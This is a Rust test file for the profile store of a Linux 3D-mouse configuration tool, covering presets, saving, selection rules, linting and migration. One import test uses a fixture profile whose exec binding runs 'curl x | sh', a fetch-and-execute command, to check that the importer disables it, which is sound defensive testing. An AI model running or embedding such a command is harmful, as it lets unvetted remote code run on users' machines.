use super::*;

fn tmpstore(name: &str) -> Store {
    let d = std::env::temp_dir().join(format!("sm-profile-test-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    Store::new(d)
}

#[test]
fn presets_are_valid_and_unique() {
    let p = presets();
    let mut ids: Vec<_> = p.iter().map(|p| p.id.clone()).collect();
    for x in &p {
        x.validate().unwrap_or_else(|e| panic!("{}: {e}", x.id));
    }
    ids.sort();
    ids.dedup();
    assert_eq!(ids.len(), p.len());
}

#[test]
fn toml_roundtrip_preserves_unknown_fields() {
    let mut p = presets().remove(2);
    p.extra.insert("future_feature".into(), toml::Value::String("x".into()));
    let t = p.to_toml().unwrap();
    let back = Profile::from_toml(&t).unwrap();
    assert_eq!(back, p);
    assert_eq!(back.extra["future_feature"].as_str(), Some("x"));
}

#[test]
fn store_save_load_atomic_and_private() {
    let s = tmpstore("save");
    assert_eq!(s.ensure_presets().unwrap(), presets().len());
    assert_eq!(s.ensure_presets().unwrap(), 0, "idempotent");
    let (all, rep) = s.load_all();
    assert_eq!(all.len(), presets().len());
    assert!(rep.quarantined.is_empty());
    let mut b = s.load("blender").unwrap();
    b.navigation.master_gain = 2.0;
    s.save(&b).unwrap();
    assert_eq!(s.load("blender").unwrap().navigation.master_gain, 2.0);
    assert!(s.path_for("blender").with_extension("toml.bak").exists());
    let mode = std::fs::metadata(s.path_for("blender")).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o600);
    // no temp files left behind
    let leftovers: Vec<_> =
        std::fs::read_dir(s.dir.join("profiles")).unwrap().flatten().filter(|e| e.file_name().to_string_lossy().contains(".tmp-")).collect();
    assert!(leftovers.is_empty());
}

#[test]
fn corrupt_profiles_are_quarantined() {
    let s = tmpstore("corrupt");
    s.ensure_presets().unwrap();
    std::fs::write(s.path_for("broken"), "this is = = not toml").unwrap();
    std::fs::write(s.path_for("blender"), "").unwrap(); // truncated by a crash
    let (all, rep) = s.load_all();
    assert_eq!(rep.quarantined.len(), 2);
    assert!(all.iter().any(|p| p.id == DEFAULT_ID));
    assert!(!s.path_for("broken").exists());
}

#[test]
fn default_cannot_be_deleted() {
    let s = tmpstore("del");
    s.ensure_presets().unwrap();
    assert!(s.delete(DEFAULT_ID).is_err());
    s.delete("kicad").unwrap();
    assert!(!s.path_for("kicad").exists());
}

#[test]
fn selection_precedence() {
    let mut ps = presets();
    let mut dev = Profile::new("compact", "Compact");
    dev.scope = Scope::Device;
    dev.device_selector = Some("256f:c635".into());
    let mut blender_compact = ps[2].clone();
    blender_compact.id = "blender-compact".into();
    blender_compact.device_selector = Some("256F:C635".into());
    ps.push(dev);
    ps.push(blender_compact);

    let c = Some("256f:c635");
    assert_eq!(select(&ps, None, "blender", "", c).1, SelectedBy::ApplicationDevice);
    assert_eq!(select(&ps, None, "blender", "", c).0.id, "blender-compact");
    assert_eq!(select(&ps, None, "Blender", "", Some("046d:c626")).0.id, "blender");
    assert_eq!(select(&ps, None, "kitty", "", c).0.id, "compact");
    assert_eq!(select(&ps, None, "kitty", "", None).0.id, DEFAULT_ID);
    assert_eq!(select(&ps, Some("desktop"), "blender", "", c), (&ps[1], SelectedBy::Manual));
    assert_eq!(select(&ps, Some("nonexistent"), "", "", None).0.id, DEFAULT_ID);
    // title-gated selector
    assert_eq!(select(&ps, None, "firefox", "Onshape - part", None).0.id, "browser-onshape");
    assert_eq!(select(&ps, None, "firefox", "news", None).0.id, "web-browsers");
    assert_eq!(select(&ps, None, "Brave-browser", "news", None).0.native_app_mode, AppMode::DesktopEmulation);
    // the title-specific profile wins regardless of id order
    let mut ps2 = presets();
    for p in ps2.iter_mut().filter(|p| p.id == "browser-onshape") {
        p.id = "zz-onshape".into();
    }
    assert_eq!(select(&ps2, None, "brave-browser", "My part | Onshape", None).0.id, "zz-onshape");
}

#[test]
fn import_neutralises_exec_and_validates() {
    let s = tmpstore("import");
    let text = r#"
id = "evil"
display_name = "Looks harmless"
[bindings.0.tap]
type = "exec"
argv = ["sh", "-c", "curl x | sh"]
confirmed = true
"#;
    let (p, prev) = import_untrusted(text, &s).unwrap();
    assert_eq!(p.schema_version, 1, "missing schema_version migrated");
    assert!(matches!(p.bindings["0"].tap, Action::Exec { confirmed: false, .. }));
    assert!(prev.warnings.iter().any(|w| w.contains("disabled")));
    assert!(!prev.overwrites_existing);
    assert!(!s.path_for("evil").exists(), "dry-run import never writes");

    assert!(import_untrusted("schema_version = 9\nid='a'\ndisplay_name='a'", &s).unwrap_err().contains("newer"));
    assert!(import_untrusted("id='Bad Id'\ndisplay_name='a'", &s).is_err());
    assert!(import_untrusted("id='x'\ndisplay_name='x'\n[navigation]\nmaster_gain = 1e9", &s).is_err());
    let json = serde_json::to_string(&presets()[3]).unwrap();
    assert_eq!(import_untrusted(&json, &s).unwrap().0.id, "freecad");
}

#[test]
fn timestamp_format() {
    let t = now_rfc3339();
    assert_eq!(t.len(), 20);
    assert!(t.starts_with("20") && t.ends_with('Z'));
}

#[test]
fn backup_contains_all() {
    let s = tmpstore("backup");
    s.ensure_presets().unwrap();
    let b = s.backup().unwrap();
    let t: toml::Table = toml::from_str(&b).unwrap();
    assert_eq!(t["profile"].as_array().unwrap().len(), presets().len());
}

proptest::proptest! {
    #[test]
    fn importer_never_panics(s in "\\PC{0,400}") {
        let st = tmpstore("fuzz");
        let _ = import_untrusted(&s, &st);
    }
}

#[test]
fn executable_and_title_regex_selectors() {
    let mut ps = presets();
    let mut by_exe = Profile::new("my-exe", "By executable");
    by_exe.scope = Scope::Application;
    by_exe.app_selector = Some(AppSelector { executables: vec!["blender-softwaregl".into(), "/opt/cad/bin/cad".into()], ..Default::default() });
    by_exe.validate().unwrap();
    let mut by_re = Profile::new("onshape-assembly", "Onshape assemblies");
    by_re.scope = Scope::Application;
    by_re.app_selector = Some(AppSelector { app_ids: vec!["firefox".into()], title_regex: Some(r"^assembly \d+ \| onshape".into()), ..Default::default() });
    by_re.validate().unwrap();
    ps.push(by_exe);
    ps.push(by_re);

    // executable by file name, from any directory; by absolute path only from that path
    assert_eq!(select_window(&ps, None, "", "", Some("/usr/bin/blender-softwaregl"), None).0.id, "my-exe");
    assert_eq!(select_window(&ps, None, "unknown", "", Some("/opt/cad/bin/cad"), None).0.id, "my-exe");
    assert_eq!(select_window(&ps, None, "unknown", "", Some("/tmp/cad"), None).0.id, DEFAULT_ID);
    // regex is case-insensitive, more specific than app-only and title-substring presets
    assert_eq!(select_window(&ps, None, "firefox", "Assembly 12 | Onshape", None, None).0.id, "onshape-assembly");
    assert_eq!(select_window(&ps, None, "firefox", "Part Studio 1 | Onshape", None, None).0.id, "browser-onshape");
    assert_eq!(select_window(&ps, None, "firefox", "news", None, None).0.id, "web-browsers");

    // invalid or oversized patterns are rejected at validation
    let mut bad = Profile::new("bad", "Bad");
    bad.scope = Scope::Application;
    bad.app_selector = Some(AppSelector { app_ids: vec!["x".into()], title_regex: Some("(unclosed".into()), ..Default::default() });
    assert!(bad.validate().is_err());
    bad.app_selector.as_mut().unwrap().title_regex = Some("a".repeat(MAX_TITLE_REGEX + 1));
    assert!(bad.validate().is_err());
    // an application profile needs an app id or an executable
    bad.app_selector = Some(AppSelector::default());
    assert!(bad.validate().is_err());
}

proptest::proptest! {
    /// Imported title patterns: arbitrary input never panics and matching stays bounded.
    #[test]
    fn title_regex_never_panics(re in "\\PC{0,64}", title in "\\PC{0,200}") {
        let sel = AppSelector { app_ids: vec!["a".into()], title_regex: Some(re), ..Default::default() };
        let _ = sel.matches_window("a", &title, None);
    }
}

#[test]
fn lint_finds_conflicts() {
    use sm_actions::{Action, Binding, RadialItem};
    let ids: Vec<String> = presets().iter().map(|p| p.id.clone()).collect();
    let mut p = Profile::new("t", "T");
    let radial = Action::Radial {
        items: vec![
            RadialItem { label: "A".into(), action: Action::Key { keys: "ctrl+z".into() } },
            RadialItem { label: "B".into(), action: Action::ProfileSwitch { profile: "nope".into() } },
        ],
    };
    p.bindings.insert("0".into(), Binding { tap: radial, hold: Some(Action::ShowHelp), double: None });
    p.bindings.insert(
        "1".into(),
        Binding {
            tap: Action::Key { keys: "ctrl+z".into() },
            hold: Some(Action::Exec { argv: vec!["true".into()], confirmed: true }),
            double: Some(Action::View { view: sm_actions::View::Top }),
        },
    );
    let l = p.lint(&ids, false);
    let has = |b: u8, frag: &str| l.iter().any(|x| x.button == Some(b) && x.message.contains(frag));
    assert!(has(0, "radial menu needs the whole press"), "{l:#?}");
    assert!(has(0, "'nope' doesn't exist"), "radial items are checked too: {l:#?}");
    assert!(has(0, "'ctrl+z' is also bound to button 2 tap"), "{l:#?}");
    assert!(has(1, "'ctrl+z' is also bound to button 1 tap › A"), "{l:#?}");
    assert!(has(1, "disabled in Settings"));
    assert!(has(1, "no 'top' view"));
    // allowed exec, valid profile: those findings go away
    assert!(!p.lint(&ids, true).iter().any(|x| x.message.contains("disabled in Settings")));
    // the shipped presets are clean (apart from views they intentionally leave to the app)
    for pr in presets() {
        let errs: Vec<_> = pr.lint(&ids, false).into_iter().filter(|x| x.severity == "error").collect();
        assert!(errs.is_empty(), "preset {} has lint errors: {errs:#?}", pr.id);
    }
}

#[test]
fn desktop_modes_validate_and_round_trip() {
    // FR-507 opt-in modes: shipped as presets without an app selector, so never auto-selected
    let ps = presets();
    for id in ["media-control", "accessibility-pointer", "game-joystick"] {
        let p = ps.iter().find(|p| p.id == id).unwrap_or_else(|| panic!("preset {id}"));
        assert!(p.app_selector.is_none(), "{id} must be opt-in");
        p.validate().unwrap();
        let back = Profile::from_toml(&p.to_toml().unwrap()).unwrap();
        assert_eq!(&back, p, "{id} round trip");
    }
    assert_ne!(select(&ps, None, "spotify", "", None).0.id, "media-control");

    // an old profile without the new fields still loads as plain scrolling
    let old = Profile::from_toml("schema_version = 1\nid = \"x\"\ndisplay_name = \"X\"\n[desktop]\nscroll_speed = 1000.0\n").unwrap();
    assert_eq!(old.desktop.style, MotionStyle::Scroll);
    assert!(old.desktop.axis_keys.is_empty());

    let mut p = ps.iter().find(|p| p.id == "media-control").unwrap().clone();
    let ok = p.desktop.axis_keys[0].clone();
    let bad = [
        AxisKeys { axis: 6, ..ok.clone() },
        AxisKeys { threshold: 0.1, ..ok.clone() },
        AxisKeys { threshold: 1.0, ..ok.clone() },
        AxisKeys { repeat_ms: 50, ..ok.clone() },
        AxisKeys { repeat_ms: 5000, ..ok.clone() },
        AxisKeys { positive: String::new(), negative: String::new(), ..ok.clone() },
        AxisKeys { positive: "ctrl+nosuchkey".into(), ..ok.clone() },
        AxisKeys { negative: "alt+sysrq".into(), ..ok.clone() },
    ];
    for b in bad {
        p.desktop.axis_keys = vec![b.clone()];
        assert!(p.validate().is_err(), "accepted {b:?}");
    }
    p.desktop.axis_keys = vec![ok; MAX_AXIS_KEYS + 1];
    assert!(p.validate().is_err(), "accepted too many gestures");
    p.desktop.axis_keys.clear();
    p.desktop.pointer_speed = 10.0;
    assert!(p.validate().is_err(), "accepted a pointer speed of 10");
}

#[test]
fn legacy_config_dir_moves_once_and_never_overwrites() {
    let base = std::env::temp_dir().join(format!("sm-migrate-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&base);
    let (old, new) = (base.join("spacemouse-linux"), base.join("3dmouse-linux"));
    std::fs::create_dir_all(old.join("profiles")).unwrap();
    std::fs::write(old.join("profiles/blender.toml"), "x").unwrap();
    assert!(migrate_dir(&old, &new));
    assert_eq!(std::fs::read_to_string(new.join("profiles/blender.toml")).unwrap(), "x");
    assert!(!old.exists());
    // an existing new directory always wins
    std::fs::create_dir_all(&old).unwrap();
    assert!(!migrate_dir(&old, &new));
    assert!(old.exists());
    // nothing to move
    let _ = std::fs::remove_dir_all(&old);
    assert!(!migrate_dir(&old, &base.join("other")));
    std::fs::remove_dir_all(&base).unwrap();
}
